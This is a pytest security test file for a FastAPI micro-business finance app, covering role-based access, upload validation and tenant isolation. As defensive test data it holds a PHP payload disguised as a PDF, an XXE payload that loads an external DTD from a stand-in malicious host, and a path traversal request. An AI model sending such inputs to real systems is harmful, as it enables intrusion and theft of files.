import io
import os
import pytest
from fastapi.testclient import TestClient

from app.main import app
from app.config import settings, Settings
from app.database import get_db, Base, engine
from app.models.user import User, UserRole
from app.models.empresa import Empresa
from app.models.caixa import CaixaTurno
from app.models.despesa import Despesa
from app.security import hash_password, create_access_token


@pytest.fixture(scope="module")
def client():
    return TestClient(app)


@pytest.fixture(scope="module")
def setup_security_data():
    """Cria empresas, usuários com papéis distintos (ADMIN, OPERATOR) e dados para os testes de RBAC."""
    db = next(get_db())
    try:
        # Garante criação de tabelas
        Base.metadata.create_all(bind=engine)

        # 1. Empresa de Teste A (ID 1)
        empresa_a = db.query(Empresa).filter(Empresa.cnpj == "11.111.111/0001-11").first()
        if not empresa_a:
            empresa_a = Empresa(
                nome_empresarial="Empresa A Teste MEI",
                nome_fantasia="Empresa A",
                cnpj="11.111.111/0001-11",
                cpf_proprietario="111.111.111-11",
                email="empresa_a@teste.com",
                limite_mei_anual=81000.00
            )
            db.add(empresa_a)
            db.commit()
            db.refresh(empresa_a)

        # 2. Empresa de Teste B (ID 2)
        empresa_b = db.query(Empresa).filter(Empresa.cnpj == "22.222.222/0002-22").first()
        if not empresa_b:
            empresa_b = Empresa(
                nome_empresarial="Empresa B Teste MEI",
                nome_fantasia="Empresa B",
                cnpj="22.222.222/0002-22",
                cpf_proprietario="222.222.222-22",
                email="empresa_b@teste.com",
                limite_mei_anual=81000.00
            )
            db.add(empresa_b)
            db.commit()
            db.refresh(empresa_b)

        # 3. Usuário ADMIN da Empresa A
        admin_a = db.query(User).filter(User.email == "admin_emp_a@test.com").first()
        if not admin_a:
            admin_a = User(
                nome="Admin Empresa A",
                email="admin_emp_a@test.com",
                hashed_password=hash_password("AdminPass123!"),
                role=UserRole.ADMIN,
                empresa_id=empresa_a.id,
                ativo=True
            )
            db.add(admin_a)

        # 4. Usuário OPERATOR da Empresa A
        operator_a = db.query(User).filter(User.email == "operator_emp_a@test.com").first()
        if not operator_a:
            operator_a = User(
                nome="Operador Empresa A",
                email="operator_emp_a@test.com",
                hashed_password=hash_password("OperPass123!"),
                role=UserRole.OPERATOR,
                empresa_id=empresa_a.id,
                ativo=True
            )
            db.add(operator_a)

        # 5. Usuário ADMIN da Empresa B (para teste de isolamento multi-tenant)
        admin_b = db.query(User).filter(User.email == "admin_emp_b@test.com").first()
        if not admin_b:
            admin_b = User(
                nome="Admin Empresa B",
                email="admin_emp_b@test.com",
                hashed_password=hash_password("AdminBPass123!"),
                role=UserRole.ADMIN,
                empresa_id=empresa_b.id,
                ativo=True
            )
            db.add(admin_b)

        db.commit()

        # Cria tokens de acesso JWT
        token_admin_a = create_access_token({"sub": admin_a.email, "empresa_id": empresa_a.id, "role": "ADMIN"})
        token_operator_a = create_access_token({"sub": operator_a.email, "empresa_id": empresa_a.id, "role": "OPERATOR"})
        token_admin_b = create_access_token({"sub": admin_b.email, "empresa_id": empresa_b.id, "role": "ADMIN"})

        return {
            "empresa_a": empresa_a,
            "empresa_b": empresa_b,
            "token_admin_a": token_admin_a,
            "token_operator_a": token_operator_a,
            "token_admin_b": token_admin_b,
        }
    finally:
        db.close()


# =====================================================================
# TESTES DE RBAC: DASHBOARD E ROTAS FINANCEIRAS
# =====================================================================

def test_dashboard_operator_masked_financial_metrics(client, setup_security_data):
    """Garante que usuários OPERATOR recebam métricas financeiras mascaradas no Dashboard."""
    token_operator = setup_security_data["token_operator_a"]
    headers = {"Authorization": f"Bearer {token_operator}"}

    response = client.get("/api/dashboard", headers=headers)
    assert response.status_code == 200

    data = response.json()
    assert data["is_restricted"] is True
    assert data["role"] == "OPERATOR"
    # Campos confidenciais devem estar estritamente zerados/ocultados
    assert data["lucro_operacional_mes"] == 0.0
    assert data["venda_mes"] == 0.0
    assert data["venda_ano"] == 0.0
    assert data["entradas_mes"] == 0.0
    assert data["saidas_mes"] == 0.0
    assert data["ticket_medio_mes"] == 0.0
    assert data["valor_estoque_custo"] == 0.0
    assert data["das_status_mes_atual"] is None
    assert data["das_qtd_atrasados"] == 0


def test_dashboard_admin_receives_full_financial_metrics(client, setup_security_data):
    """Garante que ADMIN receba métricas completas e flag is_restricted=False."""
    token_admin = setup_security_data["token_admin_a"]
    headers = {"Authorization": f"Bearer {token_admin}"}

    response = client.get("/api/dashboard", headers=headers)
    assert response.status_code == 200

    data = response.json()
    assert data["is_restricted"] is False
    assert data["role"] in ("ADMIN", "OWNER")


def test_financial_routes_block_operator_access(client, setup_security_data):
    """Verifica que o perfil OPERATOR recebe 403 Forbidden em todos os endpoints financeiros confidenciais."""
    token_operator = setup_security_data["token_operator_a"]
    headers = {"Authorization": f"Bearer {token_operator}"}

    # 1. Despesas
    res = client.get("/api/despesas", headers=headers)
    assert res.status_code == 403, f"Esperado 403 para GET /api/despesas, recebido {res.status_code}"

    res = client.get("/api/despesas/resumo", headers=headers)
    assert res.status_code == 403

    res = client.post("/api/despesas", json={"categoria": "Aluguel", "descricao": "Teste", "valor": 100.0, "data": "2026-03-01"}, headers=headers)
    assert res.status_code == 403

    # 2. Controle DAS Mensal
    res = client.get("/api/das", headers=headers)
    assert res.status_code == 403

    res = client.get("/api/das/resumo", headers=headers)
    assert res.status_code == 403

    # 3. Relatório Oficial MEI
    res = client.get("/api/relatorio-mei", headers=headers)
    assert res.status_code == 403

    # 4. Saúde do Negócio
    res = client.get("/api/saude-negocio", headers=headers)
    assert res.status_code == 403

    # 5. Resumo de Compras
    res = client.get("/api/compras/resumo", headers=headers)
    assert res.status_code == 403


def test_financial_routes_allow_admin_access(client, setup_security_data):
    """Verifica que o perfil ADMIN acessa os módulos financeiros normalmente."""
    token_admin = setup_security_data["token_admin_a"]
    headers = {"Authorization": f"Bearer {token_admin}"}

    res = client.get("/api/despesas", headers=headers)
    assert res.status_code == 200

    res = client.get("/api/despesas/resumo", headers=headers)
    assert res.status_code == 200

    res = client.get("/api/das", headers=headers)
    assert res.status_code == 200

    res = client.get("/api/relatorio-mei", headers=headers)
    assert res.status_code == 200

    res = client.get("/api/saude-negocio", headers=headers)
    assert res.status_code == 200


# =====================================================================
# TESTES DE UPLOADS: MAGIC BYTES, STREAMING E CONTROLE MULTI-TENANT
# =====================================================================

def test_upload_comprovante_valid_pdf_magic_bytes(client, setup_security_data):
    """Upload de arquivo PDF com assinatura autêntica (%PDF-) deve ser aceito."""
    token_admin = setup_security_data["token_admin_a"]
    headers = {"Authorization": f"Bearer {token_admin}"}

    # Cabeçalho PDF real
    valid_pdf_bytes = b"%PDF-1.4\n1 0 obj\n<<\n>>\nendobj\ntrailer\n<<\n>>\n%%EOF"
    files = {"file": ("recibo_valido.pdf", io.BytesIO(valid_pdf_bytes), "application/pdf")}

    res = client.post("/api/compras/upload-comprovante", headers=headers, files=files)
    assert res.status_code == 200
    data = res.json()
    assert "/comprovantes/" in data["url"]
    assert data["tipo"] == "PDF"


def test_upload_comprovante_valid_png_magic_bytes(client, setup_security_data):
    """Upload de imagem PNG com assinatura autêntica (\x89PNG...) deve ser aceito."""
    token_admin = setup_security_data["token_admin_a"]
    headers = {"Authorization": f"Bearer {token_admin}"}

    valid_png_bytes = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15c4"
    files = {"file": ("nota_balcao.png", io.BytesIO(valid_png_bytes), "image/png")}

    res = client.post("/api/compras/upload-comprovante", headers=headers, files=files)
    assert res.status_code == 200
    data = res.json()
    assert data["tipo"] == "PNG"


def test_upload_comprovante_spoofed_extension_rejected_by_magic_bytes(client, setup_security_data):
    """Arquivo malicioso disfarçado de PDF com conteúdo de texto/script deve ser rejeitado."""
    token_admin = setup_security_data["token_admin_a"]
    headers = {"Authorization": f"Bearer {token_admin}"}

    fake_pdf_content = b"<?php echo 'malicious payload'; ?>"
    files = {"file": ("exploit.pdf", io.BytesIO(fake_pdf_content), "application/pdf")}

    res = client.post("/api/compras/upload-comprovante", headers=headers, files=files)
    assert res.status_code == 400
    assert "Assinatura inválida" in res.json()["detail"]


def test_upload_comprovante_exceeding_size_limit_rejected(client, setup_security_data):
    """Comprovante que excede 10 MB deve ser rejeitado com 413 Payload Too Large."""
    token_admin = setup_security_data["token_admin_a"]
    headers = {"Authorization": f"Bearer {token_admin}"}

    # Simula conteúdo com cabeçalho PDF excedendo 10 MB
    header = b"%PDF-1.4\n"
    oversized_content = header + (b"A" * (10 * 1024 * 1024 + 100))
    files = {"file": ("arquivo_gigante.pdf", io.BytesIO(oversized_content), "application/pdf")}

    res = client.post("/api/compras/upload-comprovante", headers=headers, files=files)
    assert res.status_code == 413
    assert "excede o limite máximo permitido de 10 MB" in res.json()["detail"]


def test_upload_xml_nfe_blocks_dangerous_xxe_entity_injection(client, setup_security_data):
    """XML de NF-e contendo entidade DTD externa maliciosa (Billion laughs / XXE) deve ser rejeitado."""
    token_admin = setup_security_data["token_admin_a"]
    headers = {"Authorization": f"Bearer {token_admin}"}

    malicious_xml = (
        b'<?xml version="1.0"?>\n'
        b'<!DOCTYPE nfe [\n'
        b'  <!ENTITY % xxe SYSTEM "http://malicious-server.com/evil.dtd">\n'
        b']>\n'
        b'<nfeProc><NFe></NFe></nfeProc>'
    )
    files = {"file": ("nota_xxe.xml", io.BytesIO(malicious_xml), "text/xml")}

    res = client.post("/api/nfe/preview-xml", headers=headers, files=files)
    assert res.status_code == 400
    assert "entidades DTD" in res.json()["detail"]


# =====================================================================
# TESTES DE DOWNLOAD SEGURO E PROTEÇÃO MULTI-TENANT DE /UPLOADS
# =====================================================================

def test_download_comprovante_multi_tenant_isolation(client, setup_security_data):
    """
    Garante que a Empresa B não consiga fazer download do comprovante da Empresa A (IDOR).
    E garante que Path Traversal seja bloqueado.
    """
    token_admin_a = setup_security_data["token_admin_a"]
    token_admin_b = setup_security_data["token_admin_b"]
    empresa_a_id = setup_security_data["empresa_a"].id

    # 1. Faz upload legítimo pela Empresa A
    pdf_bytes = b"%PDF-1.4\n1 0 obj\n<<\n>>\nendobj\ntrailer\n<<\n>>\n%%EOF"
    files = {"file": ("recibo_empresa_a.pdf", io.BytesIO(pdf_bytes), "application/pdf")}
    res_upload = client.post("/api/compras/upload-comprovante", headers={"Authorization": f"Bearer {token_admin_a}"}, files=files)
    assert res_upload.status_code == 200
    safe_url = res_upload.json()["url"]
    filename = safe_url.split("/")[-1]

    # 2. Download pelo ADMIN da Empresa A (Sucesso)
    res_get_a = client.get(f"/api/compras/comprovantes/{filename}", headers={"Authorization": f"Bearer {token_admin_a}"})
    assert res_get_a.status_code == 200
    assert res_get_a.content == pdf_bytes

    # 3. Download pelo ADMIN da Empresa B (Bloqueado: 403 Forbidden)
    res_get_b = client.get(f"/api/compras/comprovantes/{filename}", headers={"Authorization": f"Bearer {token_admin_b}"})
    assert res_get_b.status_code == 403
    assert "Acesso não autorizado a este comprovante" in res_get_b.json()["detail"]

    # 4. Tentativa de Path Traversal bloqueada
    res_traversal = client.get("/api/compras/comprovantes/..%2F..%2Fsecret.txt", headers={"Authorization": f"Bearer {token_admin_a}"})
    assert res_traversal.status_code in (400, 404)


def test_download_comprovante_via_token_query_param(client, setup_security_data):
    """Garante que a autenticação via ?token=... na query string funcione para links com target=_blank."""
    token_admin_a = setup_security_data["token_admin_a"]

    # Upload de arquivo de teste
    png_bytes = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15c4"
    files = {"file": ("token_test.png", io.BytesIO(png_bytes), "image/png")}
    res_upload = client.post("/api/compras/upload-comprovante", headers={"Authorization": f"Bearer {token_admin_a}"}, files=files)
    safe_url = res_upload.json()["url"]
    filename = safe_url.split("/")[-1]

    # Download sem header Authorization, apenas com ?token=...
    res_token_query = client.get(f"/api/compras/comprovantes/{filename}?token={token_admin_a}")
    assert res_token_query.status_code == 200
    assert res_token_query.content == png_bytes


# =====================================================================
# TESTES DE DOCUMENTAÇÃO SWAGGER / OPENAPI EM PRODUÇÃO
# =====================================================================

def test_swagger_disabled_in_production():
    """Garante que em produção a documentação Swagger/OpenAPI seja desativada por padrão."""
    os.environ["ENVIRONMENT"] = "production"
    os.environ["ENABLE_DOCS"] = "false"
    try:
        prod_settings = Settings()
        assert prod_settings.should_enable_docs is False
    finally:
        os.environ["ENVIRONMENT"] = "development"
        os.environ["ENABLE_DOCS"] = "false"


def test_swagger_enabled_in_production_with_explicit_flag():
    """Garante que em produção a documentação possa ser ativada apenas se ENABLE_DOCS=true."""
    os.environ["ENVIRONMENT"] = "production"
    os.environ["ENABLE_DOCS"] = "true"
    try:
        prod_settings = Settings()
        assert prod_settings.should_enable_docs is True
    finally:
        os.environ["ENVIRONMENT"] = "development"
        os.environ["ENABLE_DOCS"] = "false"


def test_swagger_enabled_in_development():
    """Garante que em desenvolvimento a documentação permaneça habilitada."""
    os.environ["ENVIRONMENT"] = "development"
    os.environ["ENABLE_DOCS"] = "false"
    dev_settings = Settings()
    assert dev_settings.should_enable_docs is True
